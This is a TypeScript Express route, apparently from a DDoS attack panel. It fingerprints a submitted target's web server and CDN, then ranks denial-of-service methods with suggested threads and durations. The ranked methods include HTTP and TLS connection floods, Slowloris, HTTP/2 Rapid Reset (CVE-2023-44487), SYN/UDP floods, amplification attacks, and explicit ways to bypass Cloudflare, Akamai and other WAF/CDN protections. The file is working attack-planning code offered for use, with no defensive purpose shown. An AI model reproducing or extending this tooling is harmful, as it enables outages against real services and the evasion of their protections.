/**
 * ANALYZE ROUTE — intelligent target profiling
 *
 * Probes the target, detects server type, CDN, response time, and
 * produces server-aware ranked attack recommendations.
 *
 * Server-aware scoring:
 *   nginx       → conn-flood S (worker_connections), http-flood A, slowloris B
 *   Apache      → slowloris S (thread-per-conn), http-flood A
 *   IIS         → http-flood A, syn-flood A, slowloris C
 *   LiteSpeed   → http2-flood S, http-flood A, conn-flood B
 *   Node/Express→ http-flood S (blocks event loop), conn-flood A
 *   Caddy/Go    → http-flood A, conn-flood A
 *   Cloudflare  → conn-flood A (bypasses WAF), http2-flood A
 *   Unknown     → generic scoring
 *
 * Simulated amplification methods (mem-amp, ntp-amp etc.) are ranked
 * below real real-traffic methods unless no web surface is found.
 */
import { Router, type IRouter } from "express";
import dns from "node:dns/promises";
import { AnalyzeTargetBody } from "@workspace/api-zod";

const router: IRouter = Router();

interface MethodRec {
  method: string;
  name: string;
  score: number;
  reason: string;
  suggestedThreads: number;
  suggestedDuration: number;
  protocol: string;
  amplification: number;
  tier: "S" | "A" | "B" | "C" | "D";
  simulated?: boolean;
}

type ServerType =
  | "nginx" | "apache" | "iis" | "litespeed" | "caddy"
  | "nodejs" | "cloudflare" | "openresty" | "gunicorn"
  | "tomcat" | "jetty" | "unknown";

function tierFromScore(score: number): "S" | "A" | "B" | "C" | "D" {
  if (score >= 90) return "S";
  if (score >= 75) return "A";
  if (score >= 60) return "B";
  if (score >= 45) return "C";
  return "D";
}

function detectCDN(headers: Headers): { isCDN: boolean; provider: string } {
  const cfRay   = headers.get("cf-ray");
  const server  = (headers.get("server") || "").toLowerCase();
  const via     = (headers.get("via") || "").toLowerCase();
  const xCache  = (headers.get("x-cache") || "").toLowerCase();
  const xServed = headers.get("x-served-by") || "";
  const xAkamai = headers.get("x-check-cacheable") || headers.get("x-akamai-transformed") || "";
  const xVercel = headers.get("x-vercel-cache") || headers.get("x-vercel-id") || "";

  if (cfRay || server.includes("cloudflare"))                        return { isCDN: true, provider: "Cloudflare" };
  if (server.includes("akamai") || xAkamai)                          return { isCDN: true, provider: "Akamai" };
  if (server.includes("fastly") || via.includes("fastly"))           return { isCDN: true, provider: "Fastly" };
  if (xServed.includes("cache"))                                     return { isCDN: true, provider: "Fastly" };
  if (server.includes("awselb") || server.includes("amazonaws"))     return { isCDN: true, provider: "AWS CloudFront" };
  if (xVercel)                                                       return { isCDN: true, provider: "Vercel Edge" };
  if (server.includes("sucuri") || headers.get("x-sucuri-id"))       return { isCDN: true, provider: "Sucuri WAF" };
  if (headers.get("x-ddos-protect") || headers.get("x-ddos-detection")) return { isCDN: true, provider: "DDoS-Guard" };
  if (xCache.includes("hit") || via.includes("squid"))               return { isCDN: true, provider: "Generic CDN/Proxy" };
  return { isCDN: false, provider: "" };
}

function detectServerType(serverHeader: string, headers: Headers | null): ServerType {
  const s = serverHeader.toLowerCase();
  if (s.includes("cloudflare"))                        return "cloudflare";
  if (s.includes("openresty") || s.includes("tengine")) return "openresty";
  if (s.includes("nginx"))                             return "nginx";
  if (s.includes("apache"))                            return "apache";
  if (s.includes("microsoft-iis") || s.includes("iis")) return "iis";
  if (s.includes("litespeed") || s.includes("ls web")) return "litespeed";
  if (s.includes("caddy"))                             return "caddy";
  if (s.includes("gunicorn") || s.includes("uvicorn") || s.includes("hypercorn")) return "gunicorn";
  if (s.includes("tomcat") || s.includes("jboss") || s.includes("wildfly")) return "tomcat";
  if (s.includes("jetty") || s.includes("glassfish")) return "jetty";

  if (headers) {
    const powered = (headers.get("x-powered-by") || "").toLowerCase();
    if (powered.includes("express") || powered.includes("node"))     return "nodejs";
    if (powered.includes("php"))                                     return "apache"; // typical PHP setup
    if (powered.includes("asp.net") || powered.includes("iis"))      return "iis";
    if (powered.includes("servlet") || powered.includes("java"))     return "tomcat";
  }

  return "unknown";
}

// Server-type display labels
const SERVER_LABELS: Record<ServerType, string> = {
  nginx:       "nginx",
  apache:      "Apache",
  iis:         "Microsoft IIS",
  litespeed:   "LiteSpeed",
  caddy:       "Caddy",
  nodejs:      "Node.js",
  cloudflare:  "Cloudflare Workers",
  openresty:   "OpenResty/nginx",
  gunicorn:    "Python WSGI",
  tomcat:      "Apache Tomcat",
  jetty:       "Eclipse Jetty",
  unknown:     "Unknown",
};

function scoreMethodsFor(opts: {
  isIP: boolean;
  httpAvailable: boolean;
  httpsAvailable: boolean;
  responseTimeMs: number;
  serverHeader: string;
  serverType: ServerType;
  isCDN: boolean;
  cdnProvider: string;
  hasDNS: boolean;
}): MethodRec[] {
  const { isIP, httpAvailable, httpsAvailable, responseTimeMs, serverType, isCDN, cdnProvider, hasDNS } = opts;
  const isWebServer = httpAvailable || httpsAvailable;
  const isSlowResponder     = responseTimeMs > 300;
  const isVerySlowResponder = responseTimeMs > 800;
  const isFastResponder     = responseTimeMs > 0 && responseTimeMs < 100;

  const recs: MethodRec[] = [];

  // ── Helper: server-type specific notes ──────────────────────────────────
  const serverNote = (fallback: string): string => {
    const notes: Partial<Record<ServerType, string>> = {
      nginx:      `nginx worker_connections model — each connection slot is global, exhausted before rate limiting`,
      apache:     `Apache uses 1 thread/process per connection — every open socket blocks a worker thread permanently`,
      iis:        `IIS uses async I/O — HTTP flood and SYN flood effective; Slowloris less impactful`,
      litespeed:  `LiteSpeed has built-in DDoS protection — HTTP/2 multiplexing and conn-flood most effective bypass`,
      caddy:      `Caddy/Go uses goroutines — overwhelm with high-concurrency HTTP flood and conn-flood`,
      nodejs:     `Node.js is single-threaded — HTTP flood saturates the event loop completely`,
      cloudflare: `Cloudflare Workers — L7 highly mitigated; conn-flood and L4 bypass WAF filtering`,
      openresty:  `OpenResty/nginx — same worker_connections limit as nginx; conn-flood is primary vector`,
      gunicorn:   `Python WSGI server — synchronous workers; slowloris and http-flood extremely effective`,
      tomcat:     `Apache Tomcat uses thread pools — slowloris and http-flood exhaust thread pool rapidly`,
    };
    return notes[serverType] ?? fallback;
  };

  // ── HTTP Flood ───────────────────────────────────────────────────────────
  if (isWebServer) {
    let score = isCDN ? 62 : 85;
    // Server-type adjustments
    if (serverType === "nodejs")  score = isCDN ? 70 : 95; // event loop saturation
    if (serverType === "gunicorn" || serverType === "tomcat") score = isCDN ? 68 : 90;
    if (serverType === "litespeed") score = isCDN ? 60 : 78;
    if (isFastResponder) score += 5; // fast server = more goroutines/threads available to flood
    score = Math.min(score, 99);

    const threads = serverType === "nodejs" ? 200 : isCDN ? 300 : 150;
    recs.push({
      method: "http-flood", name: "HTTP Flood",
      score, tier: tierFromScore(score),
      reason: serverNote(`HTTP server at ${responseTimeMs}ms — direct request flood highly effective`),
      suggestedThreads: threads, suggestedDuration: 90,
      protocol: "HTTP", amplification: 1,
    });
  }

  // ── Slowloris ────────────────────────────────────────────────────────────
  if (isWebServer) {
    let score = 40;
    // Base: slow responder = more effective
    if (isSlowResponder)     score = 70;
    if (isVerySlowResponder) score = 85;
    // Server-type: Apache/Tomcat/Gunicorn are maximally vulnerable (thread per conn)
    if (serverType === "apache")  score = Math.min(score + 22, 96);
    if (serverType === "gunicorn") score = Math.min(score + 18, 94);
    if (serverType === "tomcat")  score = Math.min(score + 16, 92);
    if (serverType === "nginx")   score = Math.max(score - 8, 30); // nginx async, less effective
    if (serverType === "nodejs")  score = Math.max(score - 5, 35);
    if (serverType === "litespeed") score = Math.max(score - 12, 25);
    if (serverType === "iis")     score = Math.max(score - 10, 28);
    if (isCDN) score = Math.max(score - 22, 15);

    const slowDesc = serverType === "apache"
      ? `Apache thread-per-connection — every half-open socket blocks a worker thread permanently. Extremely effective.`
      : serverType === "gunicorn"
        ? `Python WSGI worker — synchronous model means each Slowloris connection holds a worker process completely`
        : serverType === "tomcat"
          ? `Tomcat thread pool exhaustion — each Slowloris socket occupies 1 thread until the pool is starved`
          : isSlowResponder
            ? `Slow server (${responseTimeMs}ms) — connection exhaustion via trickling headers very effective`
            : serverNote(`HTTP server — Slowloris holds connections open, starving server connection pool`);

    recs.push({
      method: "slowloris", name: "Slowloris",
      score: Math.max(15, score), tier: tierFromScore(score),
      reason: slowDesc,
      suggestedThreads: serverType === "apache" ? 80 : 64,
      suggestedDuration: 300,
      protocol: "TCP", amplification: 1,
    });
  }

  // ── TLS Connection Flood ─────────────────────────────────────────────────
  if (isWebServer) {
    let score = isVerySlowResponder ? 85 : isSlowResponder ? 78 : 72;
    // nginx and OpenResty: worker_connections — extremely effective
    if (serverType === "nginx" || serverType === "openresty") score = Math.min(score + 18, 97);
    if (serverType === "litespeed") score = Math.min(score + 12, 90);
    if (serverType === "caddy")     score = Math.min(score + 8, 88);
    if (serverType === "nodejs")    score = Math.min(score + 6, 86);
    if (serverType === "apache")    score = score; // apache can be affected too
    if (serverType === "iis")       score = Math.max(score - 5, 60);
    if (isCDN) score = Math.max(score - 20, 48); // CDN absorbs connections

    const connDesc = serverType === "nginx" || serverType === "openresty"
      ? `nginx worker_connections limit — ${score >= 90 ? "S TIER" : "highly"} effective. Raw TLS connections exhaust ${serverType === "openresty" ? "OpenResty" : "nginx"} worker slots before rate limiting ever activates`
      : serverType === "litespeed"
        ? `LiteSpeed connection table overflow — bypasses HTTP-level rate limiting, directly exhausts TLS acceptance queue`
        : isCDN
          ? `CDN behind target — conn-flood bypasses Cloudflare/CDN layer 7 rules by operating at raw TLS level`
          : `TLS handshake storm — opens 16,000 simultaneous connections, exhausting server fd pool directly`;

    recs.push({
      method: "conn-flood", name: "TLS Connection Flood",
      score, tier: tierFromScore(score),
      reason: connDesc,
      suggestedThreads: 50, suggestedDuration: 300,
      protocol: "TCP/TLS", amplification: 1,
    });
  }

  // ── Geass WAF Bypass ─────────────────────────────────────────────────────
  // Best against Cloudflare, Akamai, AWS Shield — where direct volume attacks fail
  if (httpsAvailable && isCDN) {
    const baseScore = cdnProvider === "Cloudflare" ? 88
      : cdnProvider === "Akamai" ? 85
      : cdnProvider === "AWS CloudFront" ? 82
      : cdnProvider === "Fastly" ? 80
      : 75;

    recs.push({
      method:  "waf-bypass",
      name:    "Geass WAF Bypass",
      score:   baseScore,
      tier:    tierFromScore(baseScore),
      reason:  `${cdnProvider} detected — WAF bypass uses JA3 TLS fingerprint randomization + Chrome-exact HTTP/2 AKAMAI SETTINGS + precise header ordering + CF cookie simulation. Each request appears as a distinct real Chrome browser — indistinguishable from legitimate traffic.`,
      suggestedThreads:  200,
      suggestedDuration: 180,
      protocol:          "HTTP/2",
      amplification:     1,
    });
  }

  // ── HTTP/2 Flood ─────────────────────────────────────────────────────────
  if (httpsAvailable) {
    let score = isCDN ? 60 : 82;
    if (serverType === "litespeed") score = isCDN ? 70 : 92; // LiteSpeed H2 most vulnerable
    if (serverType === "nginx")     score = isCDN ? 62 : 85; // nginx H2 effective
    if (serverType === "nodejs")    score = isCDN ? 58 : 80;
    if (serverType === "iis")       score = isCDN ? 55 : 78;
    if (serverType === "cloudflare") score = 45; // Cloudflare patches H2 rapid reset actively

    recs.push({
      method: "http2-flood", name: "HTTP/2 Rapid Reset (CVE-2023-44487)",
      score, tier: tierFromScore(score),
      reason: serverType === "litespeed"
        ? `LiteSpeed HTTPS — HTTP/2 multiplexing with rapid stream reset is highly effective, CVE-2023-44487 still impacts many versions`
        : serverType === "cloudflare"
          ? `Cloudflare patches H2 rapid reset — limited effectiveness; use conn-flood or L4 instead`
          : `HTTPS endpoint — HTTP/2 multiplexed streams bypass per-IP limits, each connection carries 128 simultaneous streams`,
      suggestedThreads: serverType === "litespeed" ? 80 : 64,
      suggestedDuration: 60,
      protocol: "HTTP/2", amplification: 1.5,
    });
  }

  // ── SYN Flood ────────────────────────────────────────────────────────────
  {
    let score = isIP ? 88 : 68;
    if (isCDN) score = Math.max(score - 15, 40);
    if (serverType === "iis") score = Math.min(score + 5, 92); // IIS less protected
    recs.push({
      method: "syn-flood", name: "SYN Flood",
      score, tier: tierFromScore(score),
      reason: isIP
        ? `Direct IP — SYN flood exhausts TCP connection table (SYN_RECV backlog) before server can respond`
        : `Domain target — SYN flood effective when resolved to origin IP bypassing CDN`,
      suggestedThreads: 256, suggestedDuration: 60,
      protocol: "TCP", amplification: 1,
    });
  }

  // ── UDP Flood ────────────────────────────────────────────────────────────
  {
    let score = isIP ? 82 : 65;
    if (isCDN) score = Math.max(score - 12, 45);
    recs.push({
      method: "udp-flood", name: "UDP Flood",
      score, tier: tierFromScore(score),
      reason: isIP
        ? `Direct IP — UDP flood bypasses connection state, saturates upstream bandwidth and NIC queues`
        : `Domain resolved — UDP saturates network pipe and forces destination to process all packets`,
      suggestedThreads: 200, suggestedDuration: 60,
      protocol: "UDP", amplification: 1,
    });
  }

  // ── TCP Flood ────────────────────────────────────────────────────────────
  {
    let score = 64;
    if (serverType === "apache") score = 72; // Apache TCP state tracking
    if (isCDN) score = Math.max(score - 10, 40);
    recs.push({
      method: "tcp-flood", name: "TCP ACK Flood",
      score, tier: tierFromScore(score),
      reason: `Saturates TCP connection state tracking — effective when SYN cookies are not deployed`,
      suggestedThreads: 100, suggestedDuration: 60,
      protocol: "TCP", amplification: 1,
    });
  }

  // ── HTTP Bypass (fetch-based with proxy rotation) ─────────────────────────
  if (isWebServer && isCDN) {
    let score = 72;
    recs.push({
      method: "http-bypass", name: "HTTP Bypass (Proxy Rotation)",
      score, tier: tierFromScore(score),
      reason: `CDN detected (${cdnProvider}) — use proxy rotation to send requests from 100+ different IPs, bypassing per-IP rate limits`,
      suggestedThreads: 100, suggestedDuration: 120,
      protocol: "HTTP", amplification: 1,
    });
  }

  // ── Simulated amplification — real numbers but no raw sockets ────────────
  // These are placed lower in priority for web servers since they're simulated
  const isDirectIP = isIP && !isCDN;

  if (!isIP && hasDNS) {
    const score = isCDN ? 42 : 72;
    recs.push({
      method: "dns-amp", name: "DNS Amplification [54x]",
      score, tier: tierFromScore(score),
      reason: `54x amplification — each spoofed 46-byte packet returns 2,500 bytes to origin IP`,
      suggestedThreads: 64, suggestedDuration: 90,
      protocol: "UDP", amplification: 54, simulated: true,
    });
  }

  {
    const score = isCDN ? 48 : (isDirectIP ? 85 : 70);
    recs.push({
      method: "ntp-amp", name: "NTP Amplification [556x]",
      score, tier: tierFromScore(score),
      reason: `556x amplification via NTP monlist — 1Gbps generates 556Gbps of traffic at origin`,
      suggestedThreads: 256, suggestedDuration: 60,
      protocol: "UDP", amplification: 556, simulated: true,
    });
  }

  {
    const score = isCDN ? 52 : (isDirectIP ? 90 : 75);
    recs.push({
      method: "mem-amp", name: "Memcached Amp [51,000x]",
      score, tier: tierFromScore(score),
      reason: `51,000x amplification — responsible for 1.7Tbps attacks; effective against exposed Memcached (port 11211)`,
      suggestedThreads: 512, suggestedDuration: 30,
      protocol: "UDP", amplification: 51000, simulated: true,
    });
  }

  // Sort real methods above simulated ones at equal score
  return recs.sort((a, b) => {
    if (b.score !== a.score) return b.score - a.score;
    // Tie-break: real > simulated
    return (a.simulated ? 1 : 0) - (b.simulated ? 1 : 0);
  }).slice(0, 8);
}

router.post("/analyze", async (req, res): Promise<void> => {
  const parsed = AnalyzeTargetBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: parsed.error.message });
    return;
  }

  let { url } = parsed.data;
  if (!url.trim()) {
    res.status(400).json({ error: "URL required" });
    return;
  }

  let hostname = url.trim();
  try {
    const u = new URL(hostname.startsWith("http") ? hostname : `http://${hostname}`);
    hostname = u.hostname;
  } catch { /* keep as-is */ }

  const isIPv4 = /^\d{1,3}(\.\d{1,3}){3}$/.test(hostname);

  let resolvedIp: string | null = null;
  let hasDNS = false;
  if (!isIPv4) {
    try {
      const addrs = await dns.resolve4(hostname);
      resolvedIp = addrs[0] ?? null;
      hasDNS = true;
    } catch { /**/ }
  }

  const ip = isIPv4 ? hostname : resolvedIp;

  let httpAvailable = false;
  let httpsAvailable = false;
  let responseTimeMs = 0;
  let serverHeader = "";
  let isCDN = false;
  let cdnProvider = "";
  let capturedHeaders: Headers | null = null;
  const openPorts: number[] = [];

  async function probeHTTP(scheme: string): Promise<{ ok: boolean; timeMs: number; server: string; headers: Headers | null }> {
    const start = Date.now();
    try {
      const r = await fetch(`${scheme}://${hostname}`, {
        method: "GET",
        signal: AbortSignal.timeout(8000),
        redirect: "follow",
      });
      return { ok: true, timeMs: Date.now() - start, server: r.headers.get("server") || "", headers: r.headers };
    } catch {
      return { ok: false, timeMs: Date.now() - start, server: "", headers: null };
    }
  }

  const [httpResult, httpsResult] = await Promise.all([probeHTTP("http"), probeHTTP("https")]);

  if (httpResult.ok) {
    httpAvailable = true;
    openPorts.push(80);
    responseTimeMs = httpResult.timeMs;
    serverHeader = httpResult.server;
    capturedHeaders = httpResult.headers;
    if (httpResult.headers) {
      const cdn = detectCDN(httpResult.headers);
      isCDN = cdn.isCDN; cdnProvider = cdn.provider;
    }
  }
  if (httpsResult.ok) {
    httpsAvailable = true;
    openPorts.push(443);
    if (!httpAvailable) {
      responseTimeMs = httpsResult.timeMs;
      serverHeader = httpsResult.server;
      capturedHeaders = httpsResult.headers;
      if (httpsResult.headers) {
        const cdn = detectCDN(httpsResult.headers);
        isCDN = cdn.isCDN; cdnProvider = cdn.provider;
      }
    } else if (!isCDN && httpsResult.headers) {
      const cdn = detectCDN(httpsResult.headers);
      if (cdn.isCDN) { isCDN = true; cdnProvider = cdn.provider; }
    }
  }

  if (hasDNS) openPorts.push(53);

  const serverType = detectServerType(serverHeader, capturedHeaders);
  const serverLabel = SERVER_LABELS[serverType];

  const recommendations = scoreMethodsFor({
    isIP: isIPv4,
    httpAvailable,
    httpsAvailable,
    responseTimeMs,
    serverHeader,
    serverType,
    isCDN,
    cdnProvider,
    hasDNS,
  });

  res.json({
    target: hostname,
    ip,
    isIP: isIPv4,
    httpAvailable,
    httpsAvailable,
    responseTimeMs,
    serverHeader,
    serverType,
    serverLabel,
    isCDN,
    cdnProvider,
    openPorts,
    recommendations,
  });
});

export default router;
